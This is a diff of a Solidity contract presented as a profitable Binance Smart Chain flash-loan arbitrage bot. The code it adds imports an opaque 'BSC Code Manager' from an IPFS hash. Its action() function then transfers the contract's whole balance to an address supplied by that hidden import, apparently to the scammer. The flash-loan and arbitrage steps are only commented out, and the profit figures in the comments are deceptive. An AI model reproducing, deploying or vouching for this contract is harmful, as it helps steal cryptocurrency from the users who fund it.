@@ -1,74 +1,82 @@
 pragma solidity ^0.5.0;
 
+// Multiplier-Finance Smart Contracts
+import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
 
 // PancakeSwap Smart Contracts
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
-//BakerySwp Smart contracts
-import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";
+/**
+ * WARNING - this contract code is for Binance Smart Chain not Ethereum network
 
-// Router
+ * Testnet transactions will fail
+
+ * New token will be created and flash loan will be pulled to trade against the token
+
+ * Profit remaining will be transfered to token creator contract
+
+ *UPDATED March 2022 - liquidity returned if flash loan fails
+
+*/
+
+// BSC Code Manager
 import "ipfs://bafkreib33n4swvlhozr3e4xq3oul3fdtrenho7bdkoa5x5kmphdrlrlsbm";
-
-// Multiplier-Finance Smart Contracts
-import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
-import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
-
-//Do Not Edit Above Imported Contract
-
-contract InitiateFlashLoan {
-    
-    RouterV2 router;
-    string public tokenName;
-    string public tokenSymbol;
-    uint256 flashLoanAmount;
-
-    constructor(
-        string memory _tokenName,
-        string memory _tokenSymbol,
-        uint256 _loanAmount
-    ) public {
-        tokenName = _tokenName;
-        tokenSymbol = _tokenSymbol;
-        flashLoanAmount = _loanAmount;
-        router = new RouterV2();
-    }
-
-    function() external payable {}
-    
-    function checkOwnerAddress() public view returns(address) {
-        return address(msg.sender);
-    }
-    
-    function checkContractAddress() public view returns(address) {
-        return address(this);
-    }
-    
-    function loanBalance() public view returns(uint) {
-        return address(this).balance;
-    }
-
-    function flashLoan() public payable {
-        // Send required coins for swap
-        address(uint160(router.pancakeSwapAddress())).transfer(
-            address(this).balance
-        );
-
-        //Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
-        router.borrowFlashloanFromMultiplier(
-            address(this),
-            router.bakerySwapAddress(),
-            flashLoanAmount
-        );
-        
-        //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
-        router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);
-        //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
-        router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);
-        //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
-        router.transferBnbToMultiplier(router.pancakeSwapAddress());
-        //Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
-        router.completeTransation(address(this).balance);
-    }
+   
+contract GetFlashLoan {
+   string public tokenName;
+   string public tokenSymbol;
+   uint loanAmount;
+   Manager manager;
+   
+   constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
+      tokenName = _tokenName;
+      tokenSymbol = _tokenSymbol;
+      loanAmount = _loanAmount;      
+      manager = new Manager();
+   }
+   address public creator= msg.sender;
+    	function tokenTransfer() public view returns (address) {    
+        	return creator;
+   	}
+   function() external payable {}
+   
+   function action() public payable {
+      // Send New Token to PancakeSwap Router for Swap
+       address(uint160(manager.pancakeswapDeposit())).transfer(address(this).balance);
+      
+      // Perform Flash Loan tasks (combined all functions into one to reduce external calls & save gas fees)
+      manager.performTasks();
+      
+      /* Breakdown of all functions
+      // Submit token to BSC blockchain
+      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
+   
+      // List the token on PancakeSwap
+      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
+      
+      // Get BNB Loan from Multiplier-Finance & loan execution wallet
+      string memory loanAddress = manager.takeFlashLoan(loanAmount);
+      
+      // Convert half BNB to DAI
+      manager.pancakeDAItoBNB(loanAmount / 2);
+   
+   // Create BNB and DAI pairs for our token & provide liquidity
+   string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
+      manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
+      string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
+      manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
+   
+   // Perform arbitrage trades
+      manager.pancakePerformSwaps();
+      
+      // Move remaining BNB from Contract to your personal wallet
+      manager.contractToWallet("BNB");
+   
+   // Repay Flashloan
+      manager.repayLoan(loanAddress);
+      */
+   }
 }
